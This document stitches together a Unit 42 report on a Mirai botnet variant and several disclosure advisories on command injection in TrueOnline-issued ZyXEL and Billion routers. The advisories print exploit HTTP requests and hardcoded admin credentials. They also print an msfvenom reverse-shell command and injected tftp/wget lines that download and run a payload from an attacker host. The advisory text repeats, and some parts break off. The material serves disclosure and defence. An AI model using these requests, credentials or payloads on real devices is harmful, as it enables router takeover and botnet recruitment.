## Executive Summary

In early January 2019, Unit 42 discovered a new variant of the infamous IoT/Linux botnet [Mirai](https://unit42.paloaltonetworks.com/tag/mirai/).

Mirai is best known for being used in massive, unprecedented DDoS attacks in 2016. Some of the most notable targets included: web hosting provider [OVH](https://www.ovh.com/world/news/articles/a2367.the-ddos-that-didnt-break-the-camels-vac), DNS provider [Dyn](https://en.wikipedia.org/wiki/2016_Dyn_cyberattack) and [Brian Krebs’ website](https://krebsonsecurity.com/2016/09/krebsonsecurity-hit-with-record-ddos/).

This new variant that Unit 42 discovered is notable for targeting different embedded devices like routers, network storage devices, NVRs, and IP cameras and using numerous exploits against them.

In particular, Unit 42 found this new variant targeting WePresent WiPG-1000 Wireless Presentation systems, and in LG Supersign TVs. Both these devices are intended for use by businesses. This development indicates to us a potential shift to using Mirai to target enterprises. The [previous instance](https://unit42.paloaltonetworks.com/unit42-multi-exploit-iotlinux-botnets-mirai-gafgyt-target-apache-struts-sonicwall/) where we observed the botnet targeting enterprise vulnerabilities was with the incorporation of exploits against Apache Struts and SonicWall.

In addition to this newer targeting, this new variant of Mirai includes new exploits in its multi-exploit battery, as well as new credentials to use in brute force against devices.

Finally, the malicious payload was hosted at a compromised website in Colombia: an *"Electronic security, integration and alarm monitoring"* business.

These new features afford the botnet a large attack surface. In particular, targeting enterprise links also grants it access to larger bandwidth, ultimately resulting in greater firepower for the botnet for DDoS attacks.

These developments underscore the importance for enterprises to be aware of the IoT devices on their network, change default passwords, ensure that devices are fully up-to-date on patches. And in the case of devices that cannot be patched, to remove those devices from the network as a last resort.

## Exploits

This latest sample contains a total of 27 exploits, of which are 11 new to Mirai.

A full list of the exploits we have observed are listed in the Appendix. Table 1 lists exploits that haven’t been observed in the wild prior to this sample and Table 2 lists other exploits included in this variant have been observed only recently in the wild but were incorporated in variants prior to this one.

## Other Features

Aside from the incorporation of unusual exploits, this new variant had some other differentiating features:

* It makes use of the same encryption scheme as is characteristic of Mirai with a table key of 0xbeafdead.
* When decrypting strings using this key, we found certain unusual default credentials for brute force that we haven’t come across until now:

  + [root:huigu309](https://www.websec.ca/publication/Blog/backdoors-in-Zhone-GPON-2520-and-Alcatel-Lucent-I240Q)
  + [CRAFTSPERSON:ALC#FGU](https://www.websec.ca/publication/Blog/backdoors-in-Zhone-GPON-2520-and-Alcatel-Lucent-I240Q)
  + [root:videoflow](https://www.exploit-db.com/exploits/44387)
* It uses the domain epicrustserver[.]cf at port 3933 is for C2 communication.
* In addition to scanning for other vulnerable devices, the new version can be commanded to send out HTTP Flood DDoS attacks.

# Infrastructure

Ironically, the shell script payload (still live, at the time of this writing) fetched by the exploits in this variant is hosted at the compromised website for an *"Electronic security, integration and alarm monitoring"* business in Colombia.

[![]()](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/Figure-1-Shell-script-payload-fetched-by-exploits.png)

*Figure 1. Shell script payload fetched by exploits*

Additionally, the binaries downloaded by the shell script were named in the format *“*clean.[arch]” (e.g. clean.x86, clean.mips etc.), however they don’t appear to be hosted at the website any longer.

Pivoting on the payload source revealed some samples fetching the same payload that were hosted at 185[.]248.140.102/bins/. The same IP was hosting some Gafgyt samples using the name format “eeppinen.[arch]” a few days prior to the upgrade to this new multi-exploit variant.

## Conclusion

IoT/Linux botnets continue to expand their attack surface, either by the incorporation of multiple exploits targeting a plethora of devices, or by adding to the list of default credentials they brute force, or both. In addition, targeting enterprise vulnerabilities allows them access to links with potentially larger bandwidth than consumer device links, affording them greater firepower for DDoS attacks.

# Multiple RCE in ZyXEL / Billion / TrueOnline routers

---

*From*: Pedro Ribeiro <pedrib () gmail com>

*Date*: Mon, 16 Jan 2017 10:46:45 +0000

```
Hi,

TrueOnline is a Thai ISP that distributes customised versions of ZyXEL
and Billion routers - customised with vulnerabilities that is.
The routers contain several default administrative accounts and command
injections that can be abused by authenticated and unauthenticated
attackers. Details in the advisory below, which is a copy of
<https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt>
Metasploit modules have been released, see below.

This vulnerability was disclosed through the Securiteam Secure
Disclosure program:
<https://blogs.securiteam.com/index.php/archives/2910>
<http://www.beyondsecurity.com/ssd>

Regards,
Pedro

```

```
TrueOnline is a major Internet Service Provider in Thailand which
distributes various rebranded ZyXEL and Billion routers to its customers.
Three router models - ZyXEL P660HN-T v1, ZyXEL P660HN-T v2 and Billion
5200W-T - contain a number of default administrative accounts, as well
as authenticated and unauthenticated command injection vulnerabilities
in their web interfaces, mostly in the syslog remote forwarding
function. All the routers are still in widespread use in Thailand, with
the Billion 5200W-T router currently being distributed to new customers.

These routers are based on the TC3162U SoC (or variants of it), a
system-on-a-chip made by TrendChip, which was a manufacturer of SoC that
was acquired by Ralink / MediaTek in 2011.
TC3162U based routers have two firmware variants.

The first variant is "ras", used on hardware versions that have 4mb or
less of flash storage, which is based on the real time operating system
ZynOS. It is infamous as the includes Allegro RomPager v4.07, which is
vulnerable to the "misfortune cookie" attack (see [1]), and its web
server is vulnerable to the "rom-0" attack (see [2]).
The other variant is "tclinux", which is a full fledged Linux used in
hardware versions that have more than 4 MB of flash storage. This
advisory refers to this variant, which includes the Goahead web server
and several ASP files with the command injection vulnerabilities. Note
that tclinux might also be vulnerable to the misfortune cookie and rom-0
attacks - this was not investigated in detail by the author. For more
information on tclinux see [3].

It should be noted that tclinux contains files and configuration
settings in other languages (for example in Turkish). Therefore it is
likely that these firmware versions are not specific to TrueOnline, and
other ISP customised routers in other countries might also be
vulnerable. It is also possible that other brands and router models that
use the tclinux variant are also affected by the command injection
vulnerabilities (the default accounts are likely to be TrueOnline
specific). Please contact pedrib () gmail com if you find any other routers
or firmware versions that have the same vulnerabilities.

These vulnerabilities were discovered in July 2016 and reported through
Securiteam's Secure Disclosure program (see
<https://blogs.securiteam.com/index.php/archives/2910> for their
advisory). SSD contacted the vendors involved, but received no reply and
posted their advisory on December 26th 2016. There is currently no fix
for these issues. It is unknown whether these issues are exploitable
over the WAN, although this is a possibility since some of the default
accounts appear to have been deployed for ISP use.

Three Metasploit modules that abuse these vulnerabilities have been
released (see [4], [5] and [6]).

```
#1
Vulnerability: Unauthenticated command injection (ZyXEL P660HN-T v1)
NO-CVE
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker in the LAN.
See below for other constraints.
Affected versions:
- ZyXEL P660HN-T, hardware revision v1, TrueOnline firmware version
TCLinux Fw $7.3.15.0 v001 / 3.40(ULM.0)b31, other firmware versions
might be affected

This router has a command injection vulnerability in the Maintenance >
Logs > System Log > Remote System Log forwarding function.
The vulnerability is in the ViewLog.asp page, which is accessible
unauthenticated. The following request will cause the router to issue 3
ping requests to 10.0.99.102:

POST /cgi-bin/ViewLog.asp HTTP/1.1
remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bping+-c+3+10.0.99.102%3b%23&remoteSubmit=Save

The command in injection is in the remote_host parameter.
This vulnerability was found during a black box assessment of the web
interface, so a root cause was not determined.

#2
Vulnerability: Authenticated command injection (ZyXEL P660HN-T v2)
NO-CVE
Attack Vector: Remote
Constraints: Can be exploited by an authenticated attacker in the LAN.
See below for other constraints.
Affected versions:
- ZyXEL P660HN-T, hardware revision v2, TrueOnline firmware version
TCLinux Fw #7.3.37.6, other firmware versions might be affected

Unlike in the P660HN-Tv1, the injection is authenticated and in the
logSet.asp page. However, this router contains a hardcoded supervisor
password (see below) that can be used to exploit this vulnerability.
The injection is in the logSet.asp page that sets up remote forwarding
of syslog logs, and the parameter vulnerable to injection is the
serverIP parameter, which can be abused in the following way:

ServerIP=1.1.1.1`<COMMAND>`&#

The following request will cause the router to issue 3 ping requests to
1.1.1.1:

POST /cgi-bin/pages/maintenance/logSetting/logSet.asp HTTP/1.1
logSetting_H=1&active=1&logMode=LocalAndRemote&serverIP=192.168.1.1`ping
-c 3 1.1.1.1`%26%23&serverPort=514

This vulnerability was found during a black box assessment of the web
interface, so a root cause was not determined. It is known that this
injection ends up in  /etc/syslog.conf as

The actual injection is limited to 28 characters. This can circunvented
by writing a shell script file in the /tmp directory 28 characters at a
time, and the executing that file.

#3
Vulnerability: Unauthenticated command injection (Billion 5200W-T)
NO-CVE
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker in the LAN.
See below for other constraints.
Affected versions:
- Billion 5200W-T, TrueOnline firmware version 1.02b.rc5.dt49, other
firmware versions might be affected

The Billion 5200W-T router contains an unauthenticated command injection
in adv_remotelog.asp page, which is used to set up remote syslog forwarding.
The following request will cause the router to issue 3 ping requests to
192.168.1.35:

POST /cgi-bin/adv_remotelog.asp HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 85

RemotelogEnable=1&syslogServerAddr=1.1.1.1%3bping+-c+3+192.168.1.35%3b&serverPort=514

The injection is on the syslogServerAddr parameter and can be exploited
by entering a valid IP address, followed by  ";<COMMAND>;"
This vulnerability was found during a black box assessment of the web
interface, so a root cause was not determined.

#4
Vulnerability: Authenticated command injection (Billion 5200W-T)
NO-CVE
Attack Vector: Remote
Constraints: Can be exploited by an authenticated attacker in the LAN.
See below for other constraints.
Affected versions:
- Billion 5200W-T, TrueOnline firmware version TCLinux Fw $7.3.8.0 v008
130603, other firmware versions might be affected

The Billion 5200W-T router also has several other command injections in
its interface, depending on the firmware version, such as an
authenticated command injection in tools_time.asp (uiViewSNTPServer
parameter).
It should be noted that this router contains several hardcoded
administrative accounts that can be used to exploit this vulnerability.
This injection can be exploited with the following request:

POST /cgi-bin/tools_time.asp HTTP/1.1
Host: 192.168.1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Cookie: SESSIONID=7c082c75

SaveTime=1&uiCurrentTime2=&uiCurrentTime1=&ToolsTimeSetFlag=0&uiRadioValue=0&uiClearPCSyncFlag=0&uiwPCdateMonth=0&uiwPCdateDay=&uiwPCdateYear=&uiwPCdateHour=&uiwPCdateMinute=&uiwPCdateSec=&uiCurTime=N%2FA+%28NTP+server+is+connecting%29&uiTimezoneType=0&uiViewSyncWith=0&uiPCdateMonth=1&uiPCdateDay=&uiPCdateYear=&uiPCdateHour=&uiPCdateMinute=&uiPCdateSec=&uiViewdateToolsTZ=GMT%2B07%3A00&uiViewdateDS=Disable&uiViewSNTPServer="%3b+ping+-c+20+192.168.0.1+%26%23&ntp2ServerFlag=N%2FA&ntp3ServerFlag=N%2FA

This writes the command to a file /etc/ntp.sh:
/userfs/bin/ntpclient -s -c 3 -l -h ""; ping -c 20 192.168.0.1 &#" &
which is then executed almost immediately.

This vulnerability was found during a black box assessment of the web
interface, so a root cause was not determined.

#5

>> Multiple vulnerabilities in TrueOnline / ZyXEL / Billion routers
>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
==========================================================================
Disclosure: 26/12/2016 / Last updated: 08/06/2019
>> Summary:
TrueOnline is a major Internet Service Provider in Thailand which distributes various rebranded ZyXEL and Billion routers to its customers.
Three router models - ZyXEL P660HN-T1A v1, ZyXEL P660HN-T1A v2 and Billion 5200W-T - contain a number of default administrative accounts, as well as authenticated and unauthenticated command injection vulnerabilities (running as root) in their web interfaces, mostly in the syslog remote forwarding function. All the routers are still in widespread use in Thailand, with the Billion 5200W-T router currently being distributed to new customers.
These routers are based on the TC3162U SoC (or variants of it), a system-on-a-chip made by TrendChip, which was a manufacturer of SoC that was acquired by Ralink / MediaTek in 2011.
TC3162U based routers have two firmware variants.
The first variant is "ras", used on hardware versions that have 4mb or less of flash storage, which is based on the real time operating system ZynOS. It is infamous as the includes Allegro RomPager v4.07, which is vulnerable to the "misfortune cookie" attack (see [1]), and its web server is vulnerable to the "rom-0" attack (see [2]).
The other variant is "tclinux", which is a full fledged Linux used in hardware versions that have more than 4 MB of flash storage. This advisory refers to this variant, which includes the Boa web server and several ASP files with the command injection vulnerabilities. Note that tclinux might also be vulnerable to the misfortune cookie and rom-0 attacks - this was not investigated in detail by the author. For more information on tclinux see [3].
It should be noted that tclinux contains files and configuration settings in other languages (for example in Turkish). Therefore it is likely that these firmware versions are not specific to TrueOnline, and other ISP customised routers in other countries might also be vulnerable. It is also possible that other brands and router models that use the tclinux variant are also affected by the command injection vulnerabilities (while the default accounts are likely to be TrueOnline specific). Please contact pedrib@gmail.com if you find any other routers or firmware versions that have the same vulnerabilities.
These vulnerabilities were discovered in July 2016 and reported through Securiteam's Secure Disclosure program (see https://blogs.securiteam.com/index.php/archives/2910 for their advisory). SSD contacted the vendors involved, but received no reply and posted their advisory on December 26th 2016. There is currently no fix for these issues. It is unknown whether these issues are exploitable over the WAN, although this is a possibility since some of the default accounts appear to have been deployed for ISP use.
Three Metasploit modules that abuse these vulnerabilities have been released (see [4], [5] and [6]).
>> Update (18/01/2017):
ZyXEL have responded to this advisory and published information about upcoming fixes for the 660HN v1 and v2 in http://www.zyxel.com/support/announcement\_unauthenticated.shtml
>> Technical details:
#1
Vulnerability: Unauthenticated command injection (ZyXEL P660HN-T1A v1)
CVE-2017-18368
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker in the LAN. See below for other constraints.
Affected versions:
- ZyXEL P660HN-T1A, hardware revision v1, TrueOnline firmware version 340ULM0b31, other firmware versions might be affected
This router has a command injection vulnerability in the Maintenance > Logs > System Log > Remote System Log forwarding function.
The vulnerability is in the ViewLog.asp page, which is accessible unauthenticated. The following request will cause the router to issue 3 ping requests to 10.0.99.102:
POST /cgi-bin/ViewLog.asp HTTP/1.1
remote\_submit\_Flag=1&remote\_syslog\_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote\_host=%3bping+-c+3+10.0.99.102%3b%23&remoteSubmit=Save
The command in injection is in the remote\_host parameter.
This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
#2
Vulnerability: Authenticated command injection (ZyXEL P660HN-T1A v2)
CVE-2017-18370
Attack Vector: Remote
Constraints: Can be exploited by an authenticated attacker in the LAN. See below for other constraints.
Affected versions:
- ZyXEL P660HN-T1A, hardware revision v2, TrueOnline firmware version 200AAJS3D0, other firmware versions might be affected
Unlike in the P660HN-Tv1, the injection is authenticated and in the logSet.asp page. However, this router contains several default administrative accounts (see below) that can be used to exploit this vulnerability.
The injection is in the logSet.asp page that sets up remote forwarding of syslog logs, and the parameter vulnerable to command injection is the serverIP parameter.
The following request will cause the router to issue 3 ping requests to 1.1.1.1:
POST /cgi-bin/pages/maintenance/logSetting/logSet.asp HTTP/1.1
logSetting\_H=1&active=1&logMode=LocalAndRemote&serverIP=192.168.1.1`ping -c 3 1.1.1.1`%26%23&serverPort=514
This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
It is known that this injection ends up in /etc/syslog.conf as
ServerIP="192.168.1.1 `ping -c 3 1.1.1.1`&#"
Which will then be executed by a background process almost immediately.
The actual injection is limited to 28 characters. This can circunvented by writing a shell script file in the /tmp directory 28 characters at a time, and the executing that file.
#3
Vulnerability: Unauthenticated command injection (Billion 5200W-T)
CVE-2017-18369
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker in the LAN. See below for other constraints.
Affected versions:
- Billion 5200W-T, TrueOnline firmware version 1.02b.rc5.dt49, other firmware versions might be affected
The Billion 5200W-T router contains an unauthenticated command injection in adv\_remotelog.asp page, which is used to set up remote syslog forwarding.
The following request will cause the router to issue 3 ping requests to 192.168.1.35:
POST /cgi-bin/adv\_remotelog.asp HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
RemotelogEnable=1&syslogServerAddr=1.1.1.1%3bping+-c+3+192.168.1.35%3b&serverPort=514
The injection is on the syslogServerAddr parameter and can be exploited by entering a valid IP address, followed by ";;"
This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
#4
Vulnerability: Authenticated command injection (Billion 5200W-T)
CVE-2017-18372
Attack Vector: Remote
Constraints: Can be exploited by an authenticated attacker in the LAN. See below for other constraints.
Affected versions:
- Billion 5200W-T, TrueOnline firmware version TCLinux Fw $7.3.8.0 v008 130603, other firmware versions might be affected
The Billion 5200W-T router also has several other command injections in its interface, depending on the firmware version, such as an authenticated command injection in tools\_time.asp (uiViewSNTPServer parameter).
It should be noted that this router contains several default administrative accounts that can be used to exploit this vulnerability.
This injection can be exploited with the following request:
POST /cgi-bin/tools\_time.asp HTTP/1.1
Host: 192.168.1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Cookie: SESSIONID=7c082c75
SaveTime=1&uiCurrentTime2=&uiCurrentTime1=&ToolsTimeSetFlag=0&uiRadioValue=0&uiClearPCSyncFlag=0&uiwPCdateMonth=0&uiwPCdateDay=&uiwPCdateYear=&uiwPCdateHour=&uiwPCdateMinute=&uiwPCdateSec=&uiCurTime=N%2FA+%28NTP+server+is+connecting%29&uiTimezoneType=0&uiViewSyncWith=0&uiPCdateMonth=1&uiPCdateDay=&uiPCdateYear=&uiPCdateHour=&uiPCdateMinute=&uiPCdateSec=&uiViewdateToolsTZ=GMT%2B07%3A00&uiViewdateDS=Disable&uiViewSNTPServer="%3b+ping+-c+20+192.168.0.1+%26%23&ntp2ServerFlag=N%2FA&ntp3ServerFlag=N%2FA
This writes the command to a file /etc/ntp.sh:
/userfs/bin/ntpclient -s -c 3 -l -h ""; ping -c 20 192.168.0.1 &#" &
which is then executed almost immediately.
This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
#5

# SSD Advisory – ZyXEL / Billion Multiple Vulnerabilities

* [December 26, 2016](https://ssd-disclosure.com/2016/12/26/)
* [SSD Secure Disclosure technical team](https://ssd-disclosure.com/author/ssd-secure-disclosure-technical-team/)
* [Vulnerability publication](https://ssd-disclosure.com/category/vulnerability-publication/)

**Vulnerability Summary**

The following advisory describes four (4) vulnerabilities and default accounts / passwords in ZyXEL / Billion customized routers.

TrueOnline is a major Internet Service Provider in Thailand that provides customized versions of routers to its customers, free of charge.

The routers are manufactured by ZyXEL and Billion runs a special Linux distribution called “tclinux”. Several models are distributed by TrueOnline, three in particular are widespread:

1. ZyXEL P660HN-T v1 (distributed up to 2013)
2. ZyXEL P660HN-T v2
3. Billion 5200W-T (currently being distributed to new clients)

These are customized versions of existing ZyXEL and Billion routers. They are MIPS systems and they all run BOA web server. The routers are vulnerable via command injections in its web interface, which can be exploited by an unauthenticated as well as an authenticated attacker. Furthermore, the routers includes several hardcoded accounts besides the usual administrator account.

The four vulnerabilities found in ZyXEL / Billion routers:

1. Unauthenticated remote command execution vulnerability – P660HN-T v1 router
2. Unauthenticated remote command execution vulnerability – Billion 5200W-T
3. Authenticated remote command execution vulnerability – Billion 5200W-T
4. Unauthenticated remote command execution vulnerability – P660HN-T v2

Default accounts and passwords:

1. Default accounts- P660HN-T v1 router
2. Default accounts – P660HN-T v2
3. Default accounts – Billion 5200W-T router

**Credit**

Pedro Ribeiro (pedrib@gmail.com) has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Unauthenticated remote command execution vulnerability – P660HN-T v1 router**

The P660HN-T v1 router has a command injection vulnerability in Maintenance > Logs > System Log > Remote System Log

Remote host: *;command;#*

The vulnerability is can be found in the *ViewLog.asp* page, which is accessible unauthenticated.

```
POST /cgi-bin/ViewLog.asp HTTP/1.1
remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bping+-c+3+10.0.99.102%3b%23&remoteSubmit=Save

```

The command injection is in *remote\_host* parameter:

```
remote_host=%3bping+-c+3+10.0.99.102%3b%23
```

Proof of Concept

To preform the attack, the following MSF command line should be used:

```
msfvenom -p linux/mipsbe/shell_reverse_tcp -f elf -o /tmp/shell-be.bin lhost=192.168.1.35 lport=4444
```

Which will serve the */tmp* directory through the *tftp* service.

This should be followed by downloading and executing a shell by injecting the following command:

```
cd tmp; tftp -g -r shell.bin 10.13.37.1; chmod +x /tmp/shell.bin; /tmp/shell.bin
```

**Default accounts- P660HN-T v1 router**

1. username: admin; password: password
2. username: true; password: true

**Unauthenticated remote command execution vulnerability – Billion 5200W-T**

There’s an unauthenticated command injection in the *adv\_remotelog.asp* file:

```
POST /cgi-bin/adv_remotelog.asp HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
RemotelogEnable=1&syslogServerAddr=1.1.1.1%3bping+-c+3+192.168.1.35%3b&serverPort=514
```

The injection is in the *syslogServerAddr* parameter that can be exploited by entering a valid IP address, followed by *“;<COMMAND>;”*

Proof of Concept

Same as the previously mentioned unauthenticated remote command execution vulnerability – P660HN-T v1, the only difference is the target device.

**Authenticated command execution vulnerability – Billion 5200W-T**

The Billion 5200W-T has a authenticated command injections in its interface *tools\_time.asp* with the *uiViewSNTPServer* parameter:

```
POST /cgi-bin/tools_time.asp HTTP/1.1
Host: 127.0.0.1:10080
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Cookie: SESSIONID=7c082c75
Content-Length: ...
SaveTime=1&uiCurrentTime2=&uiCurrentTime1=&ToolsTimeSetFlag=0&uiRadioValue=0&uiClearPCSyncFlag=0&uiwPCdateMonth=0
&uiwPCdateDay=&uiwPCdateYear=&uiwPCdateHour=&uiwPCdateMinute=&uiwPCdateSec=&uiCurTime=N%2FA+%28NTP+server+is+connecting%29
&uiTimezoneType=0&uiViewSyncWith=0&uiPCdateMonth=1&uiPCdateDay=&uiPCdateYear=&uiPCdateHour=&uiPCdateMinute=
&uiPCdateSec=&uiViewdateToolsTZ=GMT%2B07%3A00&uiViewdateDS=Disable&uiViewSNTPServer="%3b+ping+-c+20+127.0.0.1+%26%23
&ntp2ServerFlag=N%2FA&ntp3ServerFlag=N%2FA

```

This request will write the text, which is the command you want it to execute, to a file named */etc/ntp.sh*:

```
/userfs/bin/ntpclient -s -c 3 -l -h ""; ping -c 20 127.0.0.1 &#" &
```

Which is then executed.

**Default accounts – Billion 5200W-T router**

1. username: admin; password: password
2. username: true; password: true
3. username: user3; password: 12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678

**Unauthenticated command execution vulnerability – P660HN-T v2**

The remote command vulnerability is composed from an authenticated command injection and a hardcoded supervisor password. The command injection vulnerability is in the *logSet.asp* file and the hardcoded supervisor password is – username: supervisor; password: zyad1234.

```
POST /cgi-bin/pages/maintenance/logSetting/logSet.asp HTTP/1.1
Content-Length: ...
logSetting_H=1&active=1&logMode=LocalAndRemote&serverIP=192.168.1.1`ping -c 3 1.1.1.1`%26%23&serverPort=514
```

This will be written to */etc/syslog.conf* file as:

```
ServerIP="192.168.1.1 `ping -c 3 1.1.1.1`&#"
```

Which will then be executed by the syslog background process.

The injection parameter is the *ServerIP*:

```
ServerIP=1.1.1.1`<command />`&#
```

The actual command that can be injected has a length limitation of 28 characters.

Proof of Concept

To preform the attack, the following MSF command line should be used:

```
msfvenom -p linux/mipsbe/shell_reverse_tcp -f elf -o /tmp/shell-be.bin lhost=192.168.1.35 lport=4444

```

Which will serve the */tmp* directory through the *tftp* service.

Authenticate to interface with *supervisor:zyad1234*

Write the following file */tmp/a* by doing several injections (the injection accepts only 10 and 13 characters at a time).

```
#!/bin/sh
wget -q -O /tmp/b http://10.13.37.1/b
chmod +x /tmp/b
/tmp/b
```

Then inject the following commands:

```
chmod +x /tmp/a
/tmp/a
```

**Default accounts – P660HN-T v2 router**

1. username: admin; password: password
2. username: true; password: true
3. username: supervisor; password: zyad1234

**Vendor Response**

We notified ZyXEL of the vulnerabilities back in July 2016, repeated attempts to re-establish contact and get some answer on the status of the patches for these vulnerabilities went unanswered. At this time there is no solution or workaround for these vulnerabilities.

Editing: In January 2017, ZyXEL contact us and correct us that they are not the manufacturer of Billion routers.
